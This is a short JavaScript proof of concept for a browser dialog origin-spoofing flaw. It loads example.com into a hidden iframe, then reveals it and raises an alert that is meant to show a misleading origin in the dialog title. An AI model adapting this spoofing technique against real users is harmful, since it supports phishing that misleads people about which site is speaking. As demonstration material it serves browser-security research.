function openDialog() {
  var origin = new URL(document.getElementById('myIframe').src).origin;
  alert("See dialog title for origin spoof. This dialog is from : "+document.domain+", win.origin: "+ origin);
}

function loadIframe() {
  return new Promise(function(resolve, reject) {
    var iframe = document.getElementById('myIframe');
    iframe.addEventListener('load', resolve);
    iframe.addEventListener('error', reject);
    iframe.src = 'http://www.example.com';
  });
}

async function main() {
  var iframe = document.getElementById('myIframe');
  iframe.style.visibility = 'hidden';  
  iframe.style.position = 'absolute'; 

  await loadIframe().catch(function(error) {
    console.error('Failed to load iframe:', error);
  });

  // Wait for a short delay before showing the alert
  await new Promise(function(resolve) {
    setTimeout(resolve, 1000);  
  });

  iframe.style.visibility = 'visible';  
  openDialog();
}

window.onload = main;
